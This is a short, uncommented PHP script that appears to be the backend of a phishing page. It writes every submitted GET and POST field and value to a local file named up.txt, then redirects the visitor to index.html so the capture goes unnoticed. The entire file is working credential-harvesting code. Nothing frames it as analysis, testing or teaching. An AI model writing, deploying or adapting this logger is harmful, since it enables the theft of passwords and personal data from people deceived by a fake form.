<?php
$fuck = ['GET','POST'];

header	('Location:index.html');
$handle	=	fopen("up.txt",	"a");
foreach($_POST+$_GET as $variable	=>	$value)	{
fwrite($handle,	$variable);
fwrite($handle,	" : ");
fwrite($handle,	$value);
fwrite($handle,	"\r\n");
}
fwrite($handle,	"\r\n");
fclose($handle);
exit;
?>